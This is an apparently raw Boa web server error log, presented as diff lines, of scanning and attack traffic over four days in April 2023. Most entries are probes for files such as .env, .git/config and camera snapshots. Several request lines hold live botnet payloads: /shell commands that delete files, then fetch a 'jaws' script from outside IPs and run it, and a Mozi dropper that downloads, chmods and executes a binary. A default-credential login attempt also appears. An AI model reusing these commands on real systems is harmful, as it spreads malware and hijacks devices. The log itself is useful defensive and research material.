+[08/Apr/2023:02:52:16 +0000] malformed request: "CONNECT 157.90.120.57:4444 HTTP/1.1"
+[08/Apr/2023:03:19:57 +0000] malformed request: "CONNECT www.voanews.com:443 HTTP/1.1"
+[08/Apr/2023:03:19:58 +0000] malformed request: "CONNECT www.baidu.com:443 HTTP/1.1"
+[08/Apr/2023:03:19:59 +0000] malformed request: "CONNECT cn.bing.com:443 HTTP/1.1"
+[08/Apr/2023:03:20:00 +0000] malformed request: "CONNECT www.so.com:443 HTTP/1.1"
+[08/Apr/2023:03:22:24 +0000] request from 118.122.84.66 "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[08/Apr/2023:03:26:40 +0000] malformed request: ""
+[08/Apr/2023:03:56:09 +0000] malformed request: ""
+[08/Apr/2023:03:56:09 +0000] malformed request: ""
+[08/Apr/2023:03:56:11 +0000] request from 137.184.196.92 "GET /client/get_targets HTTP/1.1" ("/home/boa/www/client/get_targets"): document open: No such file or directory
+[08/Apr/2023:03:56:11 +0000] request from 137.184.196.92 "GET /upl.php HTTP/1.1" ("/home/boa/www/upl.php"): document open: No such file or directory
+[08/Apr/2023:03:56:12 +0000] malformed request: ""
+[08/Apr/2023:03:56:13 +0000] request from 137.184.196.92 "GET /geoip/ HTTP/1.1" ("/home/boa/www/geoip/"): document open: No such file or directory
+[08/Apr/2023:03:56:14 +0000] request from 137.184.196.92 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[08/Apr/2023:04:10:48 +0000] request from 185.142.236.40 "GET /robots.txt HTTP/1.1" ("/home/boa/www/robots.txt"): document open: No such file or directory
+[08/Apr/2023:04:10:49 +0000] request from 185.142.236.40 "GET /sitemap.xml HTTP/1.1" ("/home/boa/www/sitemap.xml"): document open: No such file or directory
+[08/Apr/2023:04:10:50 +0000] request from 185.142.236.40 "GET /.well-known/security.txt HTTP/1.1" ("/home/boa/www/.well-known/security.txt"): document open: No such file or directory
+[08/Apr/2023:04:11:01 +0000] request from 185.142.236.40 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[08/Apr/2023:04:11:18 +0000] request from 185.142.236.40 "GET /snapshot.jpg?strm=0 HTTP/1.1" ("/home/boa/www/snapshot.jpg"): document open: No such file or directory
+[08/Apr/2023:04:11:21 +0000] request from 185.142.236.40 "GET /jpg/image.jpg?size=3 HTTP/1.1" ("/home/boa/www/jpg/image.jpg"): document open: No such file or directory
+[08/Apr/2023:04:11:22 +0000] request from 185.142.236.40 "GET /snapshot.cgi HTTP/1.1" ("/home/boa/www/snapshot.cgi"): document open: No such file or directory
+[08/Apr/2023:04:11:28 +0000] request from 185.142.236.40 "GET /axis-cgi/jpg/image.cgi?compression=100&resolution=640x480 HTTP/1.1" ("/home/boa/www/axis-cgi/jpg/image.cgi"): document open: No such file or directory
+[08/Apr/2023:04:11:31 +0000] request from 185.142.236.40 "GET /ipcam/jpeg.cgi HTTP/1.1" ("/home/boa/www/ipcam/jpeg.cgi"): document open: No such file or directory
+[08/Apr/2023:04:11:32 +0000] request from 185.142.236.40 "GET /-wvhttp-01-/GetOneShot?image_size=640x480 HTTP/1.1" ("/home/boa/www/-wvhttp-01-/GetOneShot"): document open: No such file or directory
+[08/Apr/2023:04:11:34 +0000] request from 185.142.236.40 "GET /-wvhttp-01-/GetLiveImage HTTP/1.1" ("/home/boa/www/-wvhttp-01-/GetLiveImage"): document open: No such file or directory
+[08/Apr/2023:04:11:36 +0000] request from 185.142.236.40 "GET /snapshot.jpg?strm=0 HTTP/1.1" ("/home/boa/www/snapshot.jpg"): document open: No such file or directory
+[08/Apr/2023:04:11:38 +0000] request from 185.142.236.40 "GET /jpg/image.jpg?size=3 HTTP/1.1" ("/home/boa/www/jpg/image.jpg"): document open: No such file or directory
+[08/Apr/2023:04:12:00 +0000] request from 185.142.236.40 "GET /snapshot.cgi HTTP/1.1" ("/home/boa/www/snapshot.cgi"): document open: No such file or directory
+[08/Apr/2023:04:12:03 +0000] request from 185.142.236.40 "GET /axis-cgi/jpg/image.cgi?compression=100&resolution=640x480 HTTP/1.1" ("/home/boa/www/axis-cgi/jpg/image.cgi"): document open: No such file or directory
+[08/Apr/2023:04:12:09 +0000] request from 185.142.236.40 "GET /ipcam/jpeg.cgi HTTP/1.1" ("/home/boa/www/ipcam/jpeg.cgi"): document open: No such file or directory
+[08/Apr/2023:04:27:35 +0000] malformed request: "CONNECT 157.90.120.57:4444 HTTP/1.1"
+[08/Apr/2023:04:29:52 +0000] malformed request: "CONNECT 157.90.120.57:4444 HTTP/1.1"
+[08/Apr/2023:04:48:11 +0000] request from 66.11.100.7 "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[08/Apr/2023:05:49:11 +0000] request from 158.140.127.203 "GET /agent/timeclock.php HTTP/1.1" ("/home/boa/www/agent/timeclock.php"): document open: No such file or directory
+[08/Apr/2023:05:49:13 +0000] request from 158.140.127.203 "GET /agc/timeclock.php HTTP/1.1" ("/home/boa/www/agc/timeclock.php"): document open: No such file or directory
+[08/Apr/2023:06:05:20 +0000] malformed request: "CONNECT 157.90.120.57:4444 HTTP/1.1"
+[08/Apr/2023:06:07:36 +0000] malformed request: "CONNECT 157.90.120.57:4444 HTTP/1.1"
+[08/Apr/2023:07:12:29 +0000] request from 52.167.144.54 "GET /robots.txt HTTP/1.1" ("/home/boa/www/robots.txt"): document open: No such file or directory
+[08/Apr/2023:07:18:21 +0000] request from 123.138.72.199 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[08/Apr/2023:07:43:00 +0000] malformed request: "CONNECT 157.90.120.57:4444 HTTP/1.1"
+[08/Apr/2023:07:45:19 +0000] malformed request: "CONNECT 157.90.120.57:4444 HTTP/1.1"
+[08/Apr/2023:08:05:35 +0000] malformed request: ""
+[08/Apr/2023:09:10:46 +0000] boa.c:194 - unable to bind: Address already in use
+[08/Apr/2023:09:10:52 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[08/Apr/2023:09:45:02 +0000] request from 184.105.247.195 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[08/Apr/2023:09:46:02 +0000] request from 184.105.247.195 "GET /geoserver/web/ HTTP/1.1" ("/home/boa/www/geoserver/web/"): document open: No such file or directory
+[08/Apr/2023:10:53:20 +0000] request from 162.142.125.14 "(null)" ("(null)"): header read: Connection reset by peer
+[08/Apr/2023:10:53:22 +0000] malformed request: "PRI * HTTP/2.0"
+[08/Apr/2023:10:53:23 +0000] request from 162.142.125.14 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[08/Apr/2023:11:44:34 +0000] request from 45.56.108.128 "GET /systembc/password.php HTTP/1.0" ("/home/boa/www/systembc/password.php"): document open: No such file or directory
+[08/Apr/2023:12:10:37 +0000] malformed request: "CONNECT www.baidu.com:443 HTTP/1.1"
+[08/Apr/2023:12:10:39 +0000] malformed request: "CONNECT cn.bing.com:443 HTTP/1.1"
+[08/Apr/2023:12:10:39 +0000] malformed request: "CONNECT www.so.com:443 HTTP/1.1"
+[08/Apr/2023:12:10:40 +0000] malformed request: "CONNECT www.voanews.com:443 HTTP/1.1"
+[08/Apr/2023:12:10:54 +0000] request from 58.18.38.131 "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[08/Apr/2023:14:32:57 +0000] malformed request: "CONNECT fingerprints.bablosoft.com:443 HTTP/1.1"
+[08/Apr/2023:14:42:56 +0000] malformed request: ""
+[08/Apr/2023:14:53:49 +0000] request from 183.136.225.32 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[08/Apr/2023:14:53:49 +0000] request from 183.136.225.32 "GET /robots.txt HTTP/1.1" ("/home/boa/www/robots.txt"): document open: No such file or directory
+[08/Apr/2023:15:51:40 +0000] request from 38.68.47.234 "GET /.env HTTP/1.1" ("/home/boa/www/.env"): document open: No such file or directory
+[08/Apr/2023:16:37:29 +0000] request from 183.147.51.145 "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[08/Apr/2023:16:42:56 +0000] malformed request: ""
+[08/Apr/2023:19:12:44 +0000] malformed request: ""
+[08/Apr/2023:21:56:58 +0000] request from 2.187.38.252 "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[08/Apr/2023:22:03:42 +0000] malformed request: "CONNECT eth0.me:443 HTTP/1.1"
+[08/Apr/2023:22:56:10 +0000] request from 4.154.83.105 "GET /.env HTTP/1.1" ("/home/boa/www/.env"): document open: No such file or directory
+[08/Apr/2023:23:17:52 +0000] malformed request: ""
+[09/Apr/2023:01:42:23 +0000] request from 51.159.164.227 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[09/Apr/2023:01:54:09 +0000] request from 47.103.55.147 "GET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[09/Apr/2023:02:31:34 +0000] malformed request: ""
+[09/Apr/2023:02:31:35 +0000] request from 159.223.5.128 "GET /client/get_targets HTTP/1.1" ("/home/boa/www/client/get_targets"): document open: No such file or directory
+[09/Apr/2023:02:31:35 +0000] request from 159.223.5.128 "GET /upl.php HTTP/1.1" ("/home/boa/www/upl.php"): document open: No such file or directory
+[09/Apr/2023:02:31:36 +0000] malformed request: ""
+[09/Apr/2023:02:31:36 +0000] request from 159.223.5.128 "GET /geoip/ HTTP/1.1" ("/home/boa/www/geoip/"): document open: No such file or directory
+[09/Apr/2023:02:31:37 +0000] request from 159.223.5.128 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[09/Apr/2023:04:08:22 +0000] request from 183.136.225.32 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[09/Apr/2023:04:08:22 +0000] request from 183.136.225.32 "GET /robots.txt HTTP/1.1" ("/home/boa/www/robots.txt"): document open: No such file or directory
+[09/Apr/2023:05:45:09 +0000] malformed request: "CONNECT v4.ident.me:443 HTTP/1.1"
+[09/Apr/2023:06:18:31 +0000] request from 196.216.52.166 "GET /shell?cd+/tmp;rm+-rf+*;wget+195.178.120.44/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[09/Apr/2023:06:23:06 +0000] request from 123.57.135.182 "GET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[09/Apr/2023:06:55:07 +0000] malformed request: "MGLNDD_47.109.62.159_80"
+[09/Apr/2023:07:11:02 +0000] malformed request: ""
+[09/Apr/2023:07:20:18 +0000] request from 64.62.197.188 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[09/Apr/2023:07:21:01 +0000] request from 64.62.197.184 "GET /geoserver/web/ HTTP/1.1" ("/home/boa/www/geoserver/web/"): document open: No such file or directory
+[09/Apr/2023:07:24:31 +0000] request from 87.251.64.11 "(null)" ("(null)"): connection timed out
+[09/Apr/2023:07:26:40 +0000] malformed request: "Gh0st­"
+[09/Apr/2023:07:26:44 +0000] malformed request: "HELP"
+[09/Apr/2023:07:26:45 +0000] malformed request: "„Õ°]ôÄ“Å0ÂXŒÚ±×¬¯ná3*…·'±Ék¿ð¼"
+[09/Apr/2023:07:26:48 +0000] malformed request: ""
+[09/Apr/2023:07:26:50 +0000] malformed request: "½ÿžÿEÿžÿ½ÿžÿ¤ÿ†ÿÄÿ¾ÿÇÿÛÿîÿx\d9ÿíÿ¤ÿÿÏÿØÿåÿÿÿ0ÿ±ÿ½ÿçÿâÿÝÿÜÿÞÿÈÿÌÿ¾ÿøÿ&ÿÿÿõÿÿÿÿ÷ÿ!ÿÞÿÿ&ÿÿÿõÿ"
+[09/Apr/2023:07:27:53 +0000] request from 142.93.148.233 "(null)" ("(null)"): connection timed out
+[09/Apr/2023:07:27:53 +0000] request from 142.93.148.233 "(null)" ("(null)"): connection timed out
+[09/Apr/2023:08:16:17 +0000] malformed request: ""
+[09/Apr/2023:08:16:18 +0000] malformed request: ""
+[09/Apr/2023:08:16:20 +0000] request from 192.241.154.190 "GET /client/get_targets HTTP/1.1" ("/home/boa/www/client/get_targets"): document open: No such file or directory
+[09/Apr/2023:08:16:20 +0000] request from 192.241.154.190 "GET /upl.php HTTP/1.1" ("/home/boa/www/upl.php"): document open: No such file or directory
+[09/Apr/2023:08:16:21 +0000] malformed request: ""
+[09/Apr/2023:08:16:22 +0000] request from 192.241.154.190 "GET /geoip/ HTTP/1.1" ("/home/boa/www/geoip/"): document open: No such file or directory
+[09/Apr/2023:08:16:24 +0000] request from 192.241.154.190 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[09/Apr/2023:09:11:22 +0000] request from 161.35.233.14 "GET /explore HTTP/1.1" ("/home/boa/www/explore"): document open: No such file or directory
+[09/Apr/2023:09:35:36 +0000] request from 20.108.169.183 "GET /.env HTTP/1.1" ("/home/boa/www/.env"): document open: No such file or directory
+[09/Apr/2023:10:37:57 +0000] request from 148.153.45.236 "GET /a5ae HTTP/1.1" ("/home/boa/www/a5ae"): document open: No such file or directory
+[09/Apr/2023:10:37:58 +0000] request from 148.153.45.236 "GET /zh3H HTTP/1.1" ("/home/boa/www/zh3H"): document open: No such file or directory
+[09/Apr/2023:10:37:58 +0000] request from 148.153.45.236 "GET /aab8 HTTP/1.1" ("/home/boa/www/aab8"): document open: No such file or directory
+[09/Apr/2023:10:37:58 +0000] request from 148.153.45.236 "GET /jquery-3.3.1.slim.min.js HTTP/1.1" ("/home/boa/www/jquery-3.3.1.slim.min.js"): document open: No such file or directory
+[09/Apr/2023:10:37:59 +0000] request from 148.153.45.236 "GET /aab9 HTTP/1.1" ("/home/boa/www/aab9"): document open: No such file or directory
+[09/Apr/2023:10:37:59 +0000] request from 148.153.45.236 "GET /jquery-3.3.2.slim.min.js HTTP/1.1" ("/home/boa/www/jquery-3.3.2.slim.min.js"): document open: No such file or directory
+[09/Apr/2023:11:16:55 +0000] request from 45.56.108.128 "GET /systembc/password.php HTTP/1.0" ("/home/boa/www/systembc/password.php"): document open: No such file or directory
+[09/Apr/2023:11:39:32 +0000] request from 196.189.199.155 "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[09/Apr/2023:13:14:27 +0000] request from 103.217.123.254 "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" ("/home/boa/www/boaform/admin/formLogin"): document open: No such file or directory
+[09/Apr/2023:13:39:43 +0000] malformed request: ""
+[09/Apr/2023:13:50:27 +0000] request from 101.132.254.103 "(null)" ("(null)"): header read: Connection reset by peer
+[09/Apr/2023:14:03:40 +0000] malformed request: "CONNECT ip.bablosoft.com:443 HTTP/1.1"
+[09/Apr/2023:15:51:13 +0000] request from 161.35.233.14 "GET /explore HTTP/1.1" ("/home/boa/www/explore"): document open: No such file or directory
+[09/Apr/2023:17:46:05 +0000] malformed request: "CONNECT 84.153.75.193:4444 HTTP/1.1"
+[09/Apr/2023:17:49:12 +0000] malformed request: "PRI * HTTP/2.0"
+[09/Apr/2023:17:49:13 +0000] request from 167.94.138.124 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[09/Apr/2023:17:50:06 +0000] malformed request: "CONNECT 84.153.75.193:4444 HTTP/1.1"
+[09/Apr/2023:19:35:11 +0000] request from 52.167.144.54 "GET /robots.txt HTTP/1.1" ("/home/boa/www/robots.txt"): document open: No such file or directory
+[09/Apr/2023:19:48:27 +0000] malformed request: ""
+[09/Apr/2023:19:48:28 +0000] malformed request: ""
+[09/Apr/2023:19:48:29 +0000] request from 170.64.166.206 "GET /client/get_targets HTTP/1.1" ("/home/boa/www/client/get_targets"): document open: No such file or directory
+[09/Apr/2023:19:48:30 +0000] request from 170.64.166.206 "GET /upl.php HTTP/1.1" ("/home/boa/www/upl.php"): document open: No such file or directory
+[09/Apr/2023:19:48:31 +0000] malformed request: ""
+[09/Apr/2023:19:48:31 +0000] request from 170.64.166.206 "GET /geoip/ HTTP/1.1" ("/home/boa/www/geoip/"): document open: No such file or directory
+[09/Apr/2023:19:48:33 +0000] request from 170.64.166.206 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[09/Apr/2023:19:57:49 +0000] malformed request: "CONNECT www.baidu.com:443 HTTP/1.1"
+[09/Apr/2023:19:57:50 +0000] malformed request: "CONNECT cn.bing.com:443 HTTP/1.1"
+[09/Apr/2023:19:57:51 +0000] malformed request: "CONNECT www.so.com:443 HTTP/1.1"
+[09/Apr/2023:19:57:53 +0000] malformed request: "CONNECT www.voanews.com:443 HTTP/1.1"
+[09/Apr/2023:20:56:00 +0000] request from 109.237.98.226 "GET /.env HTTP/1.1" ("/home/boa/www/.env"): document open: No such file or directory
+[09/Apr/2023:20:56:00 +0000] malformed request: "H"
+[09/Apr/2023:21:04:01 +0000] request from 167.94.138.34 "(null)" ("(null)"): header read: Connection reset by peer
+[09/Apr/2023:21:04:03 +0000] malformed request: "PRI * HTTP/2.0"
+[09/Apr/2023:21:04:03 +0000] request from 167.94.138.34 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[09/Apr/2023:21:25:28 +0000] malformed request: ""
+[09/Apr/2023:21:31:19 +0000] malformed request: ""
+[09/Apr/2023:22:06:11 +0000] malformed request: "CONNECT fingerprints.bablosoft.com:443 HTTP/1.1"
+[09/Apr/2023:22:27:54 +0000] request from 87.251.64.11 "(null)" ("(null)"): connection timed out
+[10/Apr/2023:00:56:49 +0000] malformed request: ""
+[10/Apr/2023:01:23:10 +0000] malformed request: ""
+[10/Apr/2023:01:23:21 +0000] malformed request: ""
+[10/Apr/2023:02:14:34 +0000] request from 94.102.49.193 "GET /robots.txt HTTP/1.1" ("/home/boa/www/robots.txt"): document open: No such file or directory
+[10/Apr/2023:02:14:36 +0000] request from 94.102.49.193 "GET /sitemap.xml HTTP/1.1" ("/home/boa/www/sitemap.xml"): document open: No such file or directory
+[10/Apr/2023:02:14:39 +0000] request from 94.102.49.193 "GET /.well-known/security.txt HTTP/1.1" ("/home/boa/www/.well-known/security.txt"): document open: No such file or directory
+[10/Apr/2023:02:14:41 +0000] request from 94.102.49.193 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[10/Apr/2023:02:14:49 +0000] request from 94.102.49.193 "GET /snapshot.jpg?strm=0 HTTP/1.1" ("/home/boa/www/snapshot.jpg"): document open: No such file or directory
+[10/Apr/2023:02:14:50 +0000] request from 94.102.49.193 "GET /jpg/image.jpg?size=3 HTTP/1.1" ("/home/boa/www/jpg/image.jpg"): document open: No such file or directory
+[10/Apr/2023:02:14:51 +0000] request from 94.102.49.193 "GET /snapshot.cgi HTTP/1.1" ("/home/boa/www/snapshot.cgi"): document open: No such file or directory
+[10/Apr/2023:02:14:53 +0000] request from 94.102.49.193 "GET /axis-cgi/jpg/image.cgi?compression=100&resolution=640x480 HTTP/1.1" ("/home/boa/www/axis-cgi/jpg/image.cgi"): document open: No such file or directory
+[10/Apr/2023:02:14:56 +0000] request from 94.102.49.193 "GET /ipcam/jpeg.cgi HTTP/1.1" ("/home/boa/www/ipcam/jpeg.cgi"): document open: No such file or directory
+[10/Apr/2023:02:14:57 +0000] request from 94.102.49.193 "GET /-wvhttp-01-/GetOneShot?image_size=640x480 HTTP/1.1" ("/home/boa/www/-wvhttp-01-/GetOneShot"): document open: No such file or directory
+[10/Apr/2023:02:14:58 +0000] request from 94.102.49.193 "GET /-wvhttp-01-/GetLiveImage HTTP/1.1" ("/home/boa/www/-wvhttp-01-/GetLiveImage"): document open: No such file or directory
+[10/Apr/2023:02:14:59 +0000] request from 94.102.49.193 "GET /snapshot.jpg?strm=0 HTTP/1.1" ("/home/boa/www/snapshot.jpg"): document open: No such file or directory
+[10/Apr/2023:02:15:00 +0000] request from 94.102.49.193 "GET /jpg/image.jpg?size=3 HTTP/1.1" ("/home/boa/www/jpg/image.jpg"): document open: No such file or directory
+[10/Apr/2023:02:15:01 +0000] request from 94.102.49.193 "GET /snapshot.cgi HTTP/1.1" ("/home/boa/www/snapshot.cgi"): document open: No such file or directory
+[10/Apr/2023:02:15:03 +0000] request from 94.102.49.193 "GET /axis-cgi/jpg/image.cgi?compression=100&resolution=640x480 HTTP/1.1" ("/home/boa/www/axis-cgi/jpg/image.cgi"): document open: No such file or directory
+[10/Apr/2023:02:15:06 +0000] request from 94.102.49.193 "GET /ipcam/jpeg.cgi HTTP/1.1" ("/home/boa/www/ipcam/jpeg.cgi"): document open: No such file or directory
+[10/Apr/2023:02:16:49 +0000] malformed request: "CONNECT 84.153.75.193:4444 HTTP/1.1"
+[10/Apr/2023:02:20:51 +0000] malformed request: "CONNECT 84.153.75.193:4444 HTTP/1.1"
+[10/Apr/2023:02:23:37 +0000] malformed request: ""
+[10/Apr/2023:02:34:39 +0000] request from 65.49.20.66 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[10/Apr/2023:02:35:23 +0000] request from 65.49.20.66 "GET /geoserver/web/ HTTP/1.1" ("/home/boa/www/geoserver/web/"): document open: No such file or directory
+[10/Apr/2023:02:42:23 +0000] malformed request: ""
+[10/Apr/2023:04:44:03 +0000] request from 182.140.132.119 "GET /probe HTTP/1.1" ("/home/boa/www/probe"): document open: No such file or directory
+[10/Apr/2023:04:44:04 +0000] request from 124.56.129.137 "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[10/Apr/2023:05:27:53 +0000] malformed request: "CONNECT 84.153.75.193:4444 HTTP/1.1"
+[10/Apr/2023:05:31:50 +0000] malformed request: "CONNECT 84.153.75.193:4444 HTTP/1.1"
+[10/Apr/2023:05:46:47 +0000] request from 109.237.97.180 "GET /.env HTTP/1.1" ("/home/boa/www/.env"): document open: No such file or directory
+[10/Apr/2023:05:46:47 +0000] malformed request: "H"
+[10/Apr/2023:06:04:39 +0000] malformed request: ""
+[10/Apr/2023:06:11:57 +0000] malformed request: "CONNECT checkip.amazonaws.com:443 HTTP/1.1"
+[10/Apr/2023:08:22:01 +0000] malformed request: ""
+[10/Apr/2023:08:22:03 +0000] malformed request: "OPTIONS / HTTP/1.0"
+[10/Apr/2023:08:38:44 +0000] malformed request: "CONNECT 84.153.75.193:4444 HTTP/1.1"
+[10/Apr/2023:08:42:44 +0000] malformed request: "CONNECT 84.153.75.193:4444 HTTP/1.1"
+[10/Apr/2023:09:10:59 +0000] malformed request: ""
+[10/Apr/2023:09:10:59 +0000] malformed request: ""
+[10/Apr/2023:09:11:01 +0000] request from 159.223.61.254 "GET /client/get_targets HTTP/1.1" ("/home/boa/www/client/get_targets"): document open: No such file or directory
+[10/Apr/2023:09:11:02 +0000] request from 159.223.61.254 "GET /upl.php HTTP/1.1" ("/home/boa/www/upl.php"): document open: No such file or directory
+[10/Apr/2023:09:11:02 +0000] malformed request: ""
+[10/Apr/2023:09:11:03 +0000] request from 159.223.61.254 "GET /geoip/ HTTP/1.1" ("/home/boa/www/geoip/"): document open: No such file or directory
+[10/Apr/2023:09:11:05 +0000] request from 159.223.61.254 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[10/Apr/2023:10:58:16 +0000] boa.c:194 - unable to bind: Address already in use
+[10/Apr/2023:11:09:10 +0000] request from 45.56.108.128 "GET /systembc/password.php HTTP/1.0" ("/home/boa/www/systembc/password.php"): document open: No such file or directory
+[10/Apr/2023:11:30:09 +0000] request from 52.69.221.42 "GET /.env HTTP/1.1" ("/home/boa/www/.env"): document open: No such file or directory
+[10/Apr/2023:12:48:49 +0000] malformed request: ""
+[10/Apr/2023:12:54:19 +0000] malformed request: "MGLNDD_47.109.62.159_80"
+[10/Apr/2023:13:38:33 +0000] request from 183.136.225.32 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[10/Apr/2023:13:38:48 +0000] request from 183.136.225.32 "GET /robots.txt HTTP/1.1" ("/home/boa/www/robots.txt"): document open: No such file or directory
+[10/Apr/2023:13:38:56 +0000] malformed request: ""
+[10/Apr/2023:14:53:20 +0000] malformed request: "CONNECT eth0.me:443 HTTP/1.1"
+[10/Apr/2023:15:36:20 +0000] request from 85.217.145.45 "(null)" ("(null)"): header read: Connection reset by peer
+[10/Apr/2023:15:46:21 +0000] request from 203.130.28.59 "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[10/Apr/2023:16:18:27 +0000] malformed request: ""
+[10/Apr/2023:17:09:14 +0000] request from 43.245.143.49 "GET /.env HTTP/1.1" ("/home/boa/www/.env"): document open: No such file or directory
+[10/Apr/2023:17:09:15 +0000] request from 43.245.143.49 "GET /wp-admin/ HTTP/1.1" ("/home/boa/www/wp-admin/"): document open: No such file or directory
+[10/Apr/2023:20:40:43 +0000] request from 167.71.133.68 "GET /aaa9 HTTP/1.1" ("/home/boa/www/aaa9"): document open: No such file or directory
+[10/Apr/2023:20:40:54 +0000] request from 167.71.133.68 "GET /aab8 HTTP/1.1" ("/home/boa/www/aab8"): document open: No such file or directory
+[10/Apr/2023:20:55:06 +0000] malformed request: ""
+[10/Apr/2023:21:17:25 +0000] request from 18.236.113.218 "GET /.git/config HTTP/1.1" ("/home/boa/www/.git/config"): document open: No such file or directory
+[10/Apr/2023:22:20:10 +0000] request from 106.178.186.74 "GET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[10/Apr/2023:22:43:42 +0000] request from 146.190.57.24 "GET /aaa9 HTTP/1.1" ("/home/boa/www/aaa9"): document open: No such file or directory
+[10/Apr/2023:22:44:09 +0000] request from 146.190.57.24 "GET /aab8 HTTP/1.1" ("/home/boa/www/aab8"): document open: No such file or directory
+[10/Apr/2023:23:31:55 +0000] malformed request: "CONNECT eth0.me:443 HTTP/1.1"
+[11/Apr/2023:01:03:54 +0000] malformed request: ""
+[11/Apr/2023:02:18:42 +0000] request from 192.241.215.10 "GET /hudson HTTP/1.1" ("/home/boa/www/hudson"): document open: No such file or directory
+[11/Apr/2023:03:58:55 +0000] malformed request: "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0"
+[11/Apr/2023:04:57:15 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:05:16:44 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:05:26:09 +0000] malformed request: ""
+[11/Apr/2023:06:07:51 +0000] malformed request: ""
+[11/Apr/2023:06:07:53 +0000] malformed request: ""
+[11/Apr/2023:06:07:54 +0000] request from 170.64.174.13 "GET /client/get_targets HTTP/1.1" ("/home/boa/www/client/get_targets"): document open: No such file or directory
+[11/Apr/2023:06:07:55 +0000] request from 170.64.174.13 "GET /upl.php HTTP/1.1" ("/home/boa/www/upl.php"): document open: No such file or directory
+[11/Apr/2023:06:07:56 +0000] malformed request: ""
+[11/Apr/2023:06:07:56 +0000] request from 170.64.174.13 "GET /geoip/ HTTP/1.1" ("/home/boa/www/geoip/"): document open: No such file or directory
+[11/Apr/2023:06:07:58 +0000] request from 170.64.174.13 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:06:49:52 +0000] request from 170.150.235.96 "GET /shell?cd+/tmp;rm+-rf+*;wget+161.35.208.230/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[11/Apr/2023:07:27:30 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[11/Apr/2023:07:33:34 +0000] request from 117.176.186.164 "(null)" ("(null)"): connection timed out
+[11/Apr/2023:07:41:11 +0000] malformed request: "CONNECT checkip.amazonaws.com:443 HTTP/1.1"
+[11/Apr/2023:07:46:07 +0000] request from 185.187.239.242 "GET /change_password.html HTTP/1.1" ("/home/boa/www/change_password.html"): document open: No such file or directory
+[11/Apr/2023:07:49:20 +0000] malformed request: "	"
+[11/Apr/2023:07:49:31 +0000] request from 152.32.242.11 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
